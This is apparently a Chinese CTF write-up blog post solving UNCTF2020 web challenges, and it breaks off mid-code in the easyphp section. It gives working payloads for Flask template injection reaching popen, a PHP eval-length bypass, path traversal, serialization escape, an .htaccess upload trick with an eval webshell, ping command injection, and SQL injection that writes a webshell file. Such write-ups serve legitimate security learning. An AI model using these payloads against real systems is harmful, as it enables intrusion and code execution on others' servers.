    <content type="html"><![CDATA[<h1 id="UNCTF2020赛题部分WP"><a href="#UNCTF2020赛题部分WP" class="headerlink" title="UNCTF2020赛题部分WP"></a>UNCTF2020赛题部分WP<a id="more"></a></h1><h2 id="easyflask"><a href="#easyflask" class="headerlink" title="easyflask"></a>easyflask</h2><h3 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h3><ul><li>flask模板注入</li><li>绕过过滤</li></ul><h3 id="解题过程"><a href="#解题过程" class="headerlink" title="解题过程"></a>解题过程</h3><p>开题，要求以admin登录，先到/register下注册，/login登录，刷新拿到/secret_route_you_do_not_know，要求用<code>&#39;guess&#39;</code>猜<code>secret</code></p><p>考察的就是python的flask模板注入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?guess&#x3D;&#123;&#123;config&#125;&#125;</span><br></pre></td></tr></table></figure><img src="/2020/11/11/UNCTF2020/1.png" class=""><p>经过测试有一下过滤</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\&#39;,\&quot;,[],__</span><br></pre></td></tr></table></figure><p>下面用到<code>request.args.xx</code>绕过下划线，或者用<code>request.values.xx</code>利用post传参，但是post不被允许</p><p>下面就是一点点构造payload，下面是最终的exp</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?guess=&#123;&#123;()|attr(request.args.class)|attr(request.args.bases)|attr(request.args.subclasses)()|attr(request.args.a)(117)|attr(request.args.b)|attr(request.args.c)|attr(request.args.d)(request.args.e)(request.args.f)|attr(request.args.g)()&#125;&#125;&amp;class=__class__&amp;bases=__base__&amp;subclasses=__subclasses__&amp;a=__getitem__&amp;b=__init__&amp;c=__globals__&amp;d=get&amp;e=popen&amp;f=cat flag.txt&amp;g=read</span><br></pre></td></tr></table></figure><img src="/2020/11/11/UNCTF2020/2.png" class=""><h2 id="L0vephp"><a href="#L0vephp" class="headerlink" title="L0vephp"></a>L0vephp</h2><h3 id="知识点-1"><a href="#知识点-1" class="headerlink" title="知识点"></a>知识点</h3><ul><li>php伪协议</li><li>命令执行绕过长度限制</li></ul><h3 id="解题过程-1"><a href="#解题过程-1" class="headerlink" title="解题过程"></a>解题过程</h3><p>开题，F12源码处发现提示</p><img src="/2020/11/11/UNCTF2020/3.png" class=""><p>加密编码挨个试，发现是base85，在线网站解密</p><img src="/2020/11/11/UNCTF2020/4.png" class=""><p>应该是用GET传参数action，提示了读取源码，用伪协议，base被ban，用string.rot13过滤器，读取index.php和flag.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#index.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">$action = $_GET[<span class="string">'action'</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($action))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">"/base|data|input|zip|zlib/i"</span>,$action))&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;script&gt;alert('Hacker!!!')&lt;/script&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">include</span>(<span class="string">"$action"</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">include</span>(<span class="string">"footer.php"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#flag.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$flag = <span class="string">"unctf&#123;7his_is_@_f4ke_f1a9&#125;"</span>;</span><br><span class="line"><span class="comment">//hint:316E4433782E706870</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>假的flag，根据提示，16进制转字符串<code>1nD3x.php</code>，访问</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span> </span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">$code=$_REQUEST[<span class="string">'code'</span>];</span><br><span class="line">$_=<span class="keyword">array</span>(<span class="string">'@'</span>,<span class="string">'\~'</span>,<span class="string">'\^'</span>,<span class="string">'\&amp;'</span>,<span class="string">'\?'</span>,<span class="string">'\&lt;'</span>,<span class="string">'\&gt;'</span>,<span class="string">'\*'</span>,<span class="string">'\`'</span>,<span class="string">'\+'</span>,<span class="string">'\-'</span>,<span class="string">'\''</span>,<span class="string">'\"'</span>,<span class="string">'\\\\'</span>,<span class="string">'\/'</span>); </span><br><span class="line">$__=<span class="keyword">array</span>(<span class="string">'eval'</span>,<span class="string">'system'</span>,<span class="string">'exec'</span>,<span class="string">'shell_exec'</span>,<span class="string">'assert'</span>,<span class="string">'passthru'</span>,<span class="string">'array_map'</span>,<span class="string">'ob_start'</span>,<span class="string">'create_function'</span>,<span class="string">'call_user_func'</span>,<span class="string">'call_user_func_array'</span>,<span class="string">'array_filter'</span>,<span class="string">'proc_open'</span>);</span><br><span class="line">$blacklist1 = array_merge($_);</span><br><span class="line">$blacklist2 = array_merge($__);</span><br><span class="line"><span class="keyword">if</span> (strlen($code)&gt;<span class="number">16</span>)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'Too long'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">foreach</span> ($blacklist1 <span class="keyword">as</span> $blacklisted) &#123; </span><br><span class="line">    <span class="keyword">if</span> (preg_match (<span class="string">'/'</span> . $blacklisted . <span class="string">'/m'</span>, $code)) &#123; </span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'WTF???'</span>); </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">foreach</span> ($blacklist2 <span class="keyword">as</span> $blackitem) &#123;</span><br><span class="line">    <span class="keyword">if</span> (preg_match (<span class="string">'/'</span> . $blackitem . <span class="string">'/im'</span>, $code)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'Sry,try again'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">@<span class="keyword">eval</span>($code);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>长度有限制，黑名单跟不存在没什么区别，直接用，但是构造了挺久发现长度是问题，找到了p神的文章，完美解决</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;www.leavesongs.com&#x2F;PHP&#x2F;bypass-eval-length-restrict.html</span><br></pre></td></tr></table></figure><p>利用变长参数特性展开数组，详细可以看文章讲解</p><p>payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">POST：code&#x3D;usort(...$_GET);</span><br><span class="line">GET:?1[]&#x3D;test&amp;1[]&#x3D;命令;&amp;2&#x3D;assert</span><br></pre></td></tr></table></figure><img src="/2020/11/11/UNCTF2020/5.png" class=""><h2 id="easy-ssrf"><a href="#easy-ssrf" class="headerlink" title="easy_ssrf"></a>easy_ssrf</h2><h3 id="知识点-2"><a href="#知识点-2" class="headerlink" title="知识点"></a>知识点</h3><ul><li>路径穿越</li></ul><h3 id="解题过程-2"><a href="#解题过程-2" class="headerlink" title="解题过程"></a>解题过程</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">welc0me to <span class="number">2020</span>UNCTF!!</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span><span class="string">'&lt;center&gt;&lt;strong&gt;welc0me to 2020UNCTF!!&lt;/strong&gt;&lt;/center&gt;'</span>;</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">$url = $_GET[<span class="string">'url'</span>];</span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">'/unctf\.com/'</span>,$url))&#123;</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">'/php|file|zip|bzip|zlib|base|data/i'</span>,$url))&#123;</span><br><span class="line">        $url=file_get_contents($url);</span><br><span class="line">        <span class="keyword">echo</span>($url);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span>(<span class="string">'error!!'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span>(<span class="string">"error"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>传入的参数要包含<code>unctf.com</code>，后面过滤了挺多，没想到路径穿越进行文件包含，最近题没咋碰</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload</span><br><span class="line">?url=unctf.com/../../../../flag</span><br></pre></td></tr></table></figure><h2 id="easyunserialize"><a href="#easyunserialize" class="headerlink" title="easyunserialize"></a>easyunserialize</h2><h3 id="知识点-3"><a href="#知识点-3" class="headerlink" title="知识点"></a>知识点</h3><ul><li>序列化字符串逃逸</li></ul><h3 id="解题过程-3"><a href="#解题过程-3" class="headerlink" title="解题过程"></a>解题过程</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">a</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $uname;</span><br><span class="line">    <span class="keyword">public</span> $password;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($uname,$password)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;uname=$uname;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;password=$password;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;password===<span class="string">'easy'</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">include</span>(<span class="string">'flag.php'</span>);</span><br><span class="line">                <span class="keyword">echo</span> $flag;    </span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">'wrong password'</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span><span class="params">($string)</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> str_replace(<span class="string">'challenge'</span>,<span class="string">'easychallenge'</span>,$string);</span><br><span class="line">&#125;</span><br><span class="line">$uname=$_GET[<span class="number">1</span>];</span><br><span class="line">$password=<span class="number">1</span>;</span><br><span class="line">$ser=filter(serialize(<span class="keyword">new</span> a($uname,$password)));</span><br><span class="line">$test=unserialize($ser);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>一个challenge替换成easychallenge能够逃逸4个字符，要求密码为easy，构造payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&quot;;s:8:&quot;password&quot;;s:4:&quot;easy&quot;;&#125;</span><br><span class="line">因为这里只有29个字符，要保持能够正常反序列化，要长度整，最后加3个括号</span><br><span class="line">challengechallengechallengechallengechallengechallengechallengechallenge&quot;;s:8:&quot;password&quot;;s:4:&quot;easy&quot;;&#125;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure><h2 id="ezphp"><a href="#ezphp" class="headerlink" title="ezphp"></a>ezphp</h2><h3 id="知识点-4"><a href="#知识点-4" class="headerlink" title="知识点"></a>知识点</h3><ul><li>弱类型比较</li><li>数组序列化</li></ul><h3 id="解题过程-4"><a href="#解题过程-4" class="headerlink" title="解题过程"></a>解题过程</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">$username  = <span class="string">"admin"</span>;</span><br><span class="line">$password  = <span class="string">"password"</span>;</span><br><span class="line"><span class="keyword">include</span>(<span class="string">"flag.php"</span>);</span><br><span class="line">$data = <span class="keyword">isset</span>($_POST[<span class="string">'data'</span>])? $_POST[<span class="string">'data'</span>]: <span class="string">""</span> ;</span><br><span class="line">$data_unserialize = unserialize($data);</span><br><span class="line"><span class="keyword">if</span> ($data_unserialize[<span class="string">'username'</span>]==$username&amp;&amp;$data_unserialize[<span class="string">'password'</span>]==$password)&#123;</span><br><span class="line">    <span class="keyword">echo</span> $flag;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"username or password error!"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>$username</code>和<code>$password</code>被flag.php中的覆盖了，用php弱类型比较，bool和任何字符串比较都为true</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#payload</span></span><br><span class="line">data=a:<span class="number">2</span>:&#123;s:<span class="number">8</span>:<span class="string">"username"</span>;b:<span class="number">1</span>;s:<span class="number">8</span>:<span class="string">"password"</span>;b:<span class="number">1</span>;&#125;</span><br></pre></td></tr></table></figure><img src="/2020/11/11/UNCTF2020/6.png" class=""><h2 id="babyeval"><a href="#babyeval" class="headerlink" title="babyeval"></a>babyeval</h2><h3 id="知识点-5"><a href="#知识点-5" class="headerlink" title="知识点"></a>知识点</h3><ul><li>不包含括号的命令执行</li><li>过滤器输出</li></ul><h3 id="解题过程-5"><a href="#解题过程-5" class="headerlink" title="解题过程"></a>解题过程</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="comment">// flag在flag.php</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'a'</span>]))&#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">'/\(.*\)/'</span>, $_GET[<span class="string">'a'</span>]))</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">'hacker!!!'</span>);</span><br><span class="line">        ob_start(<span class="function"><span class="keyword">function</span><span class="params">($data)</span></span>&#123;</span><br><span class="line">                 <span class="keyword">if</span> (strpos($data, <span class="string">'flag'</span>) !== <span class="keyword">false</span>)</span><br><span class="line">                 <span class="keyword">return</span> <span class="string">'ByeBye hacker'</span>;</span><br><span class="line">                 <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">                 &#125;);</span><br><span class="line">        <span class="keyword">eval</span>($_GET[<span class="string">'a'</span>]);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>匹配到括号就会退出</p><p>输出不能包含flag</p><p>用过滤器</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#payload</span></span><br><span class="line">?a=<span class="keyword">include</span> $_GET[<span class="string">'b'</span>];&amp;b=php:<span class="comment">//filter/read=convert.base64-encode/resource=flag.php</span></span><br><span class="line">这里可以换别的过滤器</span><br></pre></td></tr></table></figure><h2 id="easy-upload"><a href="#easy-upload" class="headerlink" title="easy_upload"></a>easy_upload</h2><h3 id="知识点-6"><a href="#知识点-6" class="headerlink" title="知识点"></a>知识点</h3><ul><li>php短标签</li><li>.htaccess</li></ul><h3 id="解题过程-6"><a href="#解题过程-6" class="headerlink" title="解题过程"></a>解题过程</h3><p>开题上传图片马</p><img src="/2020/11/11/UNCTF2020/7.png" class=""><p>对内容进行了检测</p><p>这里想到了php短标签</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?</span>=<span class="keyword">eval</span>($_POST[<span class="number">1</span>]);==&gt;<span class="meta">&lt;?php</span> <span class="keyword">echo</span> <span class="keyword">eval</span>($_POST[<span class="number">1</span>]);</span><br></pre></td></tr></table></figure><p>这里还有就是不能把jpg文件解析成php文件，需要上传.htaccess</p><p>由于过滤了ph，换行拼接</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#.htaccess</span></span><br><span class="line">Addtype application/x-httpd-p\</span><br><span class="line">hp .jpg</span><br></pre></td></tr></table></figure><p>上传图片，抓包修改文件名和内容如上</p><p>之后就可以直接利用马了</p><img src="/2020/11/11/UNCTF2020/8.png" class=""><h2 id="UN’s-online-tools"><a href="#UN’s-online-tools" class="headerlink" title="UN’s_online_tools"></a>UN’s_online_tools</h2><h3 id="知识点-7"><a href="#知识点-7" class="headerlink" title="知识点"></a>知识点</h3><ul><li>命令执行一些绕过</li></ul><h3 id="解题过程-7"><a href="#解题过程-7" class="headerlink" title="解题过程"></a>解题过程</h3><p>开题，是一个ping窗口，命令执行</p><p>127.0.0.1能够正常返回，下面就是进行测试了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\&#39;,;,空格，*,flag,cat,$等被过滤了</span><br></pre></td></tr></table></figure><p>没有了分号还能用管道符，空格能用%09代替，flag用fla?</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#payload</span></span><br><span class="line"><span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>|ls%<span class="number">09</span>/</span><br><span class="line"><span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>|ca\t%<span class="number">09</span>/fla?</span><br></pre></td></tr></table></figure><img src="/2020/11/11/UNCTF2020/9.png" class=""><h2 id="ezfind"><a href="#ezfind" class="headerlink" title="ezfind"></a>ezfind</h2><h3 id="知识点-8"><a href="#知识点-8" class="headerlink" title="知识点"></a>知识点</h3><ul><li>文件判断</li></ul><h3 id="解题过程-8"><a href="#解题过程-8" class="headerlink" title="解题过程"></a>解题过程</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!(is_file($name)===<span class="keyword">false</span>))</span><br><span class="line">&#123;</span><br><span class="line">flag</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">no flag</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//想要拿到flag要让!()为真，也就是比较为false</span></span><br></pre></td></tr></table></figure><p>本地测试传入数组</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    $p = $_GET[<span class="string">'file'</span>];</span><br><span class="line">var_dump($p);<span class="comment">//array(1) &#123; [0]=&gt; string(0) "" &#125;</span></span><br><span class="line">var_dump(is_file($p));<span class="comment">//NULL</span></span><br><span class="line">var_dump(<span class="keyword">NULL</span>===<span class="keyword">false</span>);<span class="comment">//false</span></span><br><span class="line">var_dump(<span class="keyword">NULL</span>===<span class="keyword">true</span>);<span class="comment">//false</span></span><br><span class="line"><span class="keyword">if</span>((is_file($p)===<span class="keyword">false</span>))&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'yes'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'bad'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>可以看到传入数组返回值为NULL，NULL怎么比较返回都是false，所以用数组即可绕过</p><img src="/2020/11/11/UNCTF2020/10.png" class=""><h2 id="checkin-sql"><a href="#checkin-sql" class="headerlink" title="checkin-sql"></a>checkin-sql</h2><h3 id="知识点-9"><a href="#知识点-9" class="headerlink" title="知识点"></a>知识点</h3><ul><li>写入shell</li></ul><h3 id="解题过程-9"><a href="#解题过程-9" class="headerlink" title="解题过程"></a>解题过程</h3><p>堆叠注入，但是set,prepare,execute不能一起用，题目提示flag不在数据库，尝试写入shell</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">s = <span class="string">"select '&lt;?php eval($_POST[123])?&gt;' into outfile '/var/www/html/1.php'"</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> s:</span><br><span class="line">    print(ord(i),end=<span class="string">','</span>)</span><br><span class="line"><span class="comment">#1';PREPARE hacker from concat(char(115,101,108,101,99,116,32,39,60,63,112,104,112,32,101,118,97,108,40,36,95,80,79,83,84,91,49,50,51,93,41,32,63,62,39,32,105,110,116,111,32,111,117,116,102,105,108,101,32,39,47,118,97,114,47,119,119,119,47,104,116,109,108,47,49,46,112,104,112,39));EXECUTE hacker;</span></span><br></pre></td></tr></table></figure><p>访问1.php，下面就是常规操作了</p><img src="/2020/11/11/UNCTF2020/11.png" class=""><h2 id="easyphp"><a href="#easyphp" class="headerlink" title="easyphp"></a>easyphp</h2><h3 id="知识点-10"><a href="#知识点-10" class="headerlink" title="知识点"></a>知识点</h3><ul><li>php复杂变量</li><li>变量覆盖</li><li>sha1比较</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$adminPassword = <span class="string">'d8b8caf4df69a81f2815pbcb74cd73ab'</span>;</span><br><span class="line"><span class="keyword">if</span> (!function_exists(<span class="string">'fuxkSQL'</span>)) &#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">fuxkSQL</span><span class="params">($iText)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $oText = $iText;</span><br><span class="line">        $oText = str_replace(<span class="string">'\\\\'</span>, <span class="string">'\\'</span>, $oText);</span><br><span class="line">        $oText = str_replace(<span class="string">'\"'</span>, <span class="string">'"'</span>, $oText);</span><br><span class="line">        $oText = str_replace(<span class="string">"\'"</span>, <span class="string">"'"</span>, $oText);</span><br><span class="line">        $oText = str_replace(<span class="string">"'"</span>, <span class="string">"''"</span>, $oText);</span><br><span class="line">        <span class="keyword">return</span> $oText;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (!function_exists(<span class="string">'getVars'</span>)) &#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">getVars</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $totals = array_merge($_GET, $_POST);</span><br><span class="line">        <span class="keyword">if</span> (count($_GET)) &#123;</span><br><span class="line">            <span class="keyword">foreach</span> ($_GET <span class="keyword">as</span> $key =&gt; $value) &#123;</span><br><span class="line">                <span class="keyword">global</span> $&#123;$key&#125;;</span><br><span class="line">                <span class="keyword">if</span> (is_array($value)) &#123;</span><br><span class="line">                    $temp_array = <span class="keyword">array</span>();</span><br><span class="line">                    <span class="keyword">foreach</span> ($value <span class="keyword">as</span> $key2 =&gt; $value2) &#123;</span><br><span class="line">                        <span class="keyword">if</span> (function_exists(<span class="string">'mysql_real_escape_string'</span>)) &#123;</span><br><span class="line">                            $temp_array[$key2] = fuxkSQL(trim($value2));</span><br><span class="line">                        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                            $temp_array[$key2] = str_replace(<span class="string">'"'</span>, <span class="string">'\"'</span>, str_replace(<span class="string">"'"</span>, <span class="string">"\'"</span>, (trim($value2))));</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                    $&#123;$key&#125; = $_GET[$key] = $temp_array;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">if</span> (function_exists(<span class="string">'mysql_real_escape_string'</span>)) &#123;</span><br><span class="line">                        